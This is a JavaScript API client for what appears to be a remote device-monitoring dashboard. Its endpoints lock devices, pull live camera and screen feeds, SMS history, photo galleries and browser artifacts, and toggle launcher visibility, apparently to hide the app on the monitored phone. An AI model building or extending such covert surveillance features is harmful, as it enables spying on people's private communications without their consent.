import axios from 'axios';
import { encryptData, decryptData } from './encryption';

const API_URL = process.env.NEXT_PUBLIC_API_URL;

const apiClient = axios.create({
  baseURL: API_URL,
  timeout: 30000,
  headers: {
    'Content-Type': 'application/json',
  },
});

// Request interceptor for authentication and encryption
apiClient.interceptors.request.use(
  async (config) => {
    const token = localStorage.getItem('authToken');
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }

    // Encrypt sensitive data before sending
    if (config.data && config.method !== 'get') {
      config.data = {
        encrypted: true,
        data: encryptData(JSON.stringify(config.data))
      };
    }

    // Add rate limiting headers
    config.headers['X-Client-ID'] = localStorage.getItem('deviceId') || 'web-client';

    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor for decryption
apiClient.interceptors.response.use(
  (response) => {
    // Decrypt response data if encrypted
    if (response.data && response.data.encrypted) {
      const decrypted = decryptData(response.data.data);
      response.data = JSON.parse(decrypted);
    }
    return response;
  },
  (error) => {
    // Handle authentication errors
    if (error.response?.status === 401) {
      localStorage.removeItem('authToken');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);

// API endpoints
export const api = {
  auth: {
    login: (credentials) => apiClient.post('/auth/login', credentials),
    register: (userData) => apiClient.post('/auth/register', userData),
    logout: () => apiClient.post('/auth/logout'),
    verifyPin: (pin) => apiClient.post('/auth/verify-pin', { pin }),
    resetData: (deviceId) => apiClient.post(`/auth/reset-data/${deviceId}`),
  },
  devices: {
    getAll: () => apiClient.get('/devices'),
    getById: (id) => apiClient.get(`/devices/${id}`),
    register: (deviceData) => apiClient.post('/devices/register', deviceData),
    update: (id, data) => apiClient.put(`/devices/${id}`, data),
    delete: (id) => apiClient.delete(`/devices/${id}`),
    lock: (id) => apiClient.post(`/devices/${id}/lock`),
    unlock: (id) => apiClient.post(`/devices/${id}/unlock`),
    getStatus: (id) => apiClient.get(`/devices/${id}/status`),
    setLostMode: (id) => apiClient.post(`/devices/${id}/lost-mode`),
  },
  monitoring: {
    getLiveCamera: (deviceId) => apiClient.get(`/monitoring/camera/${deviceId}`),
    getLiveScreen: (deviceId) => apiClient.get(`/monitoring/screen/${deviceId}`),
    getSmsHistory: (deviceId) => apiClient.get(`/monitoring/sms/${deviceId}`),
    getGallery: (deviceId) => apiClient.get(`/monitoring/gallery/${deviceId}`),
    lockDevice: (deviceId) => apiClient.post(`/monitoring/lock/${deviceId}`),
    setLauncherVisibility: (deviceId, visibility) => 
      apiClient.post(`/monitoring/launcher/${deviceId}`, { visibility }),
  },
  admin: {
    getUsers: () => apiClient.get('/admin/users'),
    createUser: (userData) => apiClient.post('/admin/users', userData),
    updateUser: (id, data) => apiClient.put(`/admin/users/${id}`, data),
    deleteUser: (id) => apiClient.delete(`/admin/users/${id}`),
    suspendUser: (id) => apiClient.post(`/admin/users/${id}/suspend`),
    getRoles: () => apiClient.get('/admin/roles'),
    updateRole: (id, data) => apiClient.put(`/admin/roles/${id}`, data),
    getLicenses: () => apiClient.get('/admin/licenses'),
    updateLicense: (id, data) => apiClient.put(`/admin/licenses/${id}`, data),
    getSystemSettings: () => apiClient.get('/admin/settings'),
    updateSystemSettings: (data) => apiClient.put('/admin/settings', data),
    getAuditLogs: () => apiClient.get('/admin/audit-logs'),
  },
  data: {
    sync: (deviceId) => apiClient.post(`/data/sync/${deviceId}`),
    backup: (deviceId) => apiClient.post(`/data/backup/${deviceId}`),
    restore: (deviceId, backupId) => apiClient.post(`/data/restore/${deviceId}`, { backupId }),
    getBrowserArtifacts: (deviceId) => 
      apiClient.get(`/data/browser-artifacts/${deviceId}`),
  },
};

export default apiClient;
